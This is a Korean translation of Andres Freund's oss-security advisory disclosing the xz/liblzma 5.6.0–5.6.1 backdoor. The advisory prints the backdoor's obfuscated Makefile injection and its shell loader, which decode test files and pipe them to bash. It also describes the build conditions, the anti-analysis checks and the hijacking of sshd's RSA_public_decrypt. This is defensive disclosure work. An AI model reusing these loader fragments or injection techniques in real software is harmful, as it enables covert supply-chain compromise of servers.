# Openwall post by Andres Freund

### 알림
- 번역에 틀린 표현이 있을 수 있습니다.  
- 번역하기 애매하거나 모호한 내용은 영어 발음을 그대로 빌려 한글로 적었습니다.  
- 의역이 다수 있습니다.
- 개인적인 해석은 괄호와 \*로 표시하였습니다. - (*예시)
- 어색한 해석의 경우 !로 표시하였습니다. - !예시
- 글 중간에 등장하는 '첨부'는 글 최하단에 존재하는 파일을 말합니다.

---

날짜: 2024년 3월 29일 금요일 08:51:26 -0700  
보낸 이: Andres Freund <andres@...razel.de>  
받는 이: oss-security@...ts.openwall.com  
제목: xz/liblzma upstream의 백도어가 ssh 서버를 손상시킵니다.

안녕하세요,

저번 주에 간 데비안 불안정 버전 설치 중 liblzma(xz 패키지의 일부)에 몇가지 이상한 현상(ssh로 로그인하는 데에 많은 CPU를 소모, valgrind 에러)이 있었고, 그에 대한 답을 알아냈습니다:

xz 레포지토리 upstream와 xz tarballs가 백도어로 쓰였습니다.

처음에 저는 데비안 패키지의 손상이라 생각했으나, upstream의 문제로 밝혀졌습니다.

---

### == 손상된 릴리즈 타르볼 ==

백도어의 한 부분은 *배포된 tarballs에만 있습니다*.  
참고로 여기 데비안의 tarball을 임포트한 링크가 있는데, 이는 5.6.0과 5.6.1 tarballs에도 존재합니다.

- https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63

해당 라인은 upstream의 `build-to-host` 소스와 xz의 git에도 *없습니다*.  
그러나 "소스 코드" 링크들을 제외하고, github가 레포지토리 컨텐츠로부터 직접 생성한 것으로 보이는 릴리즈된 upstream의 타르볼에는 존재하였습니다.

- https://github.com/tukaani-project/xz/releases/tag/v5.6.0
- https://github.com/tukaani-project/xz/releases/tag/v5.6.1

이것은 구성의 말미에 실행될 난독화된 스크립트를 주입합니다.  
이 스크립트는 레포지토리의 `test`에 있는 .xz파일들이고, 난독화 되어있습니다.

이 스크립트는 실행되고나서, 몇 가지 선제조건과 일치하면 하단의 코드

```bash
am__test = bad-3-corrupt_lzma2.xz
...
am__test_dir=$(top_srcdir)/tests/files/$(am__test)
...
sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1
```

를 포함하기위해 `$builddir/src/liblzma/Makefile`를 수정합니다.

이는

```bash
...
;sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz
| tr "	 \-_" " 	_\-"
| xz -d
| /bin/bash >/dev/null 2>&1;
...
```

로 끝납니다.

`| bash` 를 나오면 아래와 같은 코드를 생성합니다.

```bash
####Hello####
#��Z�.hj�
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024 >/dev/null) && head -c +2048
&& (head -c +1024 >/dev/null) && head -c +2048
&& (head -c +1024 >/dev/null) && head -c +2048
&& (head -c +1024 >/dev/null) && head -c +2048
&& (head -c +1024 >/dev/null) && head -c +2048
&& (head -c +1024 >/dev/null) && head -c +2048
&& (head -c +1024 >/dev/null) && head -c +2048
&& (head -c +1024 >/dev/null) && head -c +2048
&& (head -c +1024 >/dev/null) && head -c +2048
&& (head -c +1024 >/dev/null) && head -c +2048
&& (head -c +1024 >/dev/null) && head -c +2048
&& (head -c +1024 >/dev/null) && head -c +2048
&& (head -c +1024 >/dev/null) && head -c +2048
&& (head -c +1024 >/dev/null) && head -c +2048
&& (head -c +1024 >/dev/null) && head -c +2048
&& (head -c +1024 >/dev/null) && head -c +2048
&& (head -c +1024 >/dev/null) && head -c +724)";
(xz -dc $srcdir/tests/files/good-large_compressed.lzma
|eval $i
|tail -c +31265
|tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")
|xz -F raw --lzma1 -dc
|/bin/sh
####World####
```

난독화 해제 후 이는 첨부된 injected.txt로 나타납니다.

---

### == 손상된 레포지토리 ==

다수의 exploit을 보함한 upstream에서 커밋된 해당 파일들은 난독화된 형태를 띄고 있었습니다.

- tests/files/bad-3-corrupt_lzma2.xz
- tests/files/good-large_compressed.lzma

이 파일들은 하단 커밋에 처음으로 추가되었습니다.  

- https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0

참고로 5.6.0 버전에서 저 파일들은 어떠한 "tests"에도 사용되지 않았습니다.

결과적으로 주입된 코드(하단에 추가 설명)는 valgrind 에러를 발생시킵니다.  
그리고 백도어가 예상한 스택 레이아웃의 차이로 인해 일부 구성에서 충돌이 발생했습니다.  
이 문제는 5.6.1에서 동작하도록 시도되었습니다.

- https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad
- https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f
- https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92

이후 익스플로잇 코드가 수정되었습니다:

- https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89

몇 주간 활동을 고려할 때, 커미터는 직접 연관이 있거나, 그들의 시스템에 상당히 심각한 손상이 있었을 것으로 보입니다. 
 
유감스럽게도 상단에 언급한 "수정 사항"에 관해 여러 리스트에서 소통한 것으로 보아, 후자의 경우일 가능성은 낮아보입니다.

Florian Weimer께서 처음으로 주입된 코드를 따로 추출하셨습니다.  
또한 liblzma_la-crc64.fast.o를 첨부해주셨습니다.  
저는 그저 전체 바이너리만을 보면 됐습니다. 감사합니다!

---

### == 영향 받은 시스템 ==

첨부된 난독화 해제 스크립트는 구성 후 처음으로 호출되어, 빌드 과정을 수정하여 코드를 주입할지 여부를 결정합니다.

이 조건은 오직 x86-64 리눅스를 목표로 합니다:

```bash
if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) &&  
(echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
```

gcc와 gnu 링커로 빌드합니다.

```bash
if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
exit 0
fi
if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
exit 0
fi
LDv=$LD" -v"
if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
exit 0
```

데비안 혹은 RPG 패키지 빌드의 일부분으로 동작합니다:

```bash
if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
```

특히 후자의 경우 조사관이 이슈를 재현하기 어렵게 하기 위한 목적으로 보입니다.

(하단에 보이는)주입된 코드의 동작으로 인해, 백도어는 `glibc` 기반의 시스템에서만 동작하는 것으로 보입니다.

다행히 xz 5.6.0과 5.6.1은 리눅스 배포판에서 많이 통합되지 않았고, 이미 통합된 경우에도 대부분 사전 릴리즈 버전에 해당합니다.

---

### == openssh 서버로의 임팩트 관측 ==

백도어화된 `liblzma`가 설치되면서, `ssh`를 통해 로그인하는 것이 눈에 띄게 느려졌습니다.

```bash
time ssh nonexistant@...alhost
```

before:
```bash
nonexistant@...alhost: Permission denied (publickey).

real	0m0.299s
user	0m0.202s
sys	0m0.006s
```

after:
```bash
nonexistant@...alhost: Permission denied (publickey).

real	0m0.807s
user	0m0.202s
sys	0m0.006s
```

`openssh`는 `liblza`를 직접 이용하지 않습니다.  
그러나 데비안과 몇 가지 다른 배포판은 `systemd` 알림을 지원하기위해 `openssh`를 패치하고, `libsystemd`는 `lzma`에 의존합니다.

처음에 `systemd` 외부에서 시작한 `sshd`는 백도어가 잠시 호출되었음에도 속도 저하를 보이지 않았습니다.  
이는 분석을 더 어렵게 하기위한 대책의 일환으로 보입니다.

익스플로잇을 위한 관측된 요구사항:  
a) `TERM`환경 변수는 구성되어있지 않아야 합니다.  
b) `argv[0]`는 `/usr/sbin/sshd`이어야 합니다.  
c) `LD_DEBUG`, `LD_PROFILE`은 설정되어있지 않아야 합니다.  
d) `LANG`은 설정되어 있어야 합니다.  
e) 악성파일 실행 시 rr같은 몇 가지 디버깅 환경은 탐지되는 것으로 보입니다. 일반 gdb는 몇 가지 상황에선 탐지되는 것으로 보이나, 다른 경우는 탐지되지 않는 것 같습니다.

깨끗한 환경(*디펜던시가 존재하지 않는 기본 환경 구성으로 추측)에서 필수 변수만을 설정하여 서버를 시작함으로 systemd 외부에서 악성 행위를 재현을 할 수 있습니다.

```bash
env -i LANG=en_US.UTF-8 /usr/sbin/sshd -D
```

사실 성능 저하를 관측하기 위해서 openssh가 서버로서 시작될 필요는 없습니다.

slow:
```bash
env -i LANG=C /usr/sbin/sshd -h
```
(작성자 기준 이전 시스템에서 0.5초 소요)

fast:
```bash
env -i LANG=C TERM=foo /usr/sbin/sshd -h
env -i LANG=C LD_DEBUG=statistics /usr/sbin/sshd -h
...
```
(작성자 기준 같은 시스템에서 0.01초 소요)

다수의 서버가 `libsystemd`와 연결되어 있다는 것은 명백하기에 `usr/sbin/sshd`외의 `argv[0]` 또한 영향을 받을 수 있습니다.

---

### == 주입 코드 분석 ==

저는 정보보안연구원이나 리버스 엔지니어가 *아닙니다*. 제가 분석하지 않은 많은 것들이 있고, 제가 관찰한 것은 철저한 백도어 코드를 분석했다기보단 관측으로 부터 확인한 것에 가깝습니다.

저는 분석을 위해 `perf record -e intel_pt//ub`를 사용하여 백도어가 실행되는지 안되는지의 실행 분기점 관측하였습니다. 또한 gdb에서 분기 전에 브레이크 포인트를 설정하였습니다.

처음에 백도어가 ifunc resolvers인 `crc32_resolve()`, `crc64_resolve()`를 다른 코드로 대체하여 `_get_cpuid()`를 호출하고, 코드 내에 주입하는 것으로 실행을 가로챕니다.(이전에는 단순히 정적인 인라인 함수로 사용되었습니다.)  
xz 5.6.1에서 백도어는 더 난독화되어 심볼 이름이 사라졌습니다.

이 함수들은 시작하면서 호출됩니다, 왜냐하면 `sshd`는 `-Wl`, `-z`, `now`로 빌드되어 있고, 이는 모든 심볼이 먼저 호출되게 합니다.  
만약 `LD_BIND_NOT=1`로 시작한다면 백도어가 동작하지 않는 것으로 보입니다.

아래의 `crc32_resolve()`, `_get_cpuid()`가 특별히 하는 건 없습니다. 단순히 'completed' 변수가 0인지 확인하고 증가시키고, (새로운 `_cpuid()`를 통해)cpuid 결과를 반환합니다.  
`crc64_resolve()`에서 더 흥미로운 점이 확인됩니다.

두번째 호출에서 `crc64_resolve()`는 동적 링커의 데이터, 프로그램 인자, 환경 등의 다양한 데이터를 찾는 것으로 보입니다.  
그리고나서 위에 언급한 내용을 포함한 다양한 환경 검사를 수행합니다.  
여기엔 제가 완전히 추적하지 못한 다른 검사가 있습니다.

만약 위 과정이 지속되는 것으로 결정되면, 코드가 메모리의 심볼 테이블을 파싱하는 것으로 보입니다.  
이는 제가 이슈를 확인하게한 꽤 느린 과정입니다.(*이 과정 때문에 문제를 확인해보게 되었다는 것으로 보임)

특히 메인 `sshd` 바이너리 내 심볼을 포함한 `liblzma`의 심볼이 다른 많은 라이브러리 이전에 호출되었습니다.  
이는 심볼이 호출되고, `-Wl`, `-z`, `relro`로 인해 `GOT`이 읽기 전용으로 다시 맵핑되기 때문에 중요합니다.

아직 로드되지 않은 라이브러리 내 심볼을 처리하기 위해서 백도어는 동적 링커에 감사 후크를 설치하여야합니다. 이는 하단의 코드를 사용하여 관측할 수 있습니다.

```bash
watch _rtld_global_ro._dl_naudit
```

이는 메인 바이너리만을 위해서 감사 후크가 설치된 것으로 보입니다.

해당 후크는 메인 바이너리의 다량의 심볼을 위해서 `_dl_audit_symbind`로부터 호출됩니다.  
이는 호출되기 위해 `RSA_public_decrypt@....plt`를 기다리는 걸로 보입니다.  
해당 심볼이 호출될 때, 백도어는 `RSA_public_decrypt@....plt`의 값이 자체 코드를 가리키도록 변경합니다.  
이는 감사 후크 메커니즘을 통해 이루어지는 것이 아니라, 외부를 통해 동작합니다.

아직 제가 이해하지 못한 부분으로, 어떠한 이유로 인해 `sym.st_value` *및* 감사 후크의 반환 값이 다른 값으로 변경되어 `_dl_audit_symbind()`가 아무 작업도 하지 않도록 만듭니다. - !그렇다면 변경한 일체의 행동은 왜 한걸까요?

과정이 끝난 후 감사 후크는 다시 삭제(Uninstall)됩니다.

`got.plt`가 아직 읽기 전용으로 다시 맵핑되지 않았기 때문에 `got.plt`의 내용을 이번 단계에 변경하는게 가능합니다.

이 단계에서 추가적인 변경이 이루어질 수 있다고 의심됩니다.

---

### == sshd로의 임팩트 ==

이전 섹션에선 `RSA_public_decrypt@....plt`가 백도어 코드를 가리키도록 리다이렉트 되었다는 것을 설명하였습니다.  
제가 분석한 추적에선 퍼블릭키 로그인 간 익스플로잇 코드가 호출된다는 것을 보여주었습니다.

```bash
sshd 1736357 [010] 714318.734008:
1  branches:uH:
5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) =>
5555555612d0 RSA_public_decrypt@...+0x0 (/usr/sbin/sshd)
```

이후 백도어는 추측컨대, 일반 인증을 수행하기 위해 `libcrypto`를 콜백합니다.

```bash
sshd 1736357 [010] 714318.734009:
1  branches:uH:
7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) =>
7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.3)
```

저는 인가되지 않은 접근을 허용하기 위해 주입된 코드 내에서 무엇이 확인되는지 면밀하게 분석하지 않았습니다.  
이는 사전 인증 부분에서 실행되기에, 접근이나 원격 코드 실행을 허용할 것으로 보입니다.

잠재적인 시스템 취약점이 발견되는대로 업그레이드 하겠습니다.

---

### == 버그 리포트 ==

Upstream의 관여가 확인되어 upstream측 버그를 보고하지 않았습니다.  
처음엔 데비안의 특정 문제라 생각되어, 추가적인 예비 리포트를 security@...ian.org. 로 전달하였습니다.  
이후 문제를 distros@에 보고하였습니다.  
CISA는 배포를 통해 전달받았습니다.

레드헷이 해당 문제를 CVE-2024-3094로 할당하였습니다.

---

### == 설치 취약점 탐지 ==

Vegard Nossum께서 하단 첨부에 존재하는 시스템의 ssh 바이너리가 취약한지 탐지하는 스크립트를 작성해주셨습니다. 감사합니다!

---

Greetings,

Andres Freund

View attachment "[injected.txt](https://www.openwall.com/lists/oss-security/2024/03/29/4/1)" of type "text/plain" (8236 bytes)

Download attachment "[liblzma_la-crc64-fast.o.gz](https://www.openwall.com/lists/oss-security/2024/03/29/4/2)" of type "application/gzip" (36487 bytes)

Download attachment "[detect.sh](https://www.openwall.com/lists/oss-security/2024/03/29/4/3)" of type "application/x-sh" (426 bytes)

---
[Go To Top ↑](#openwall-post-by-andres-freund)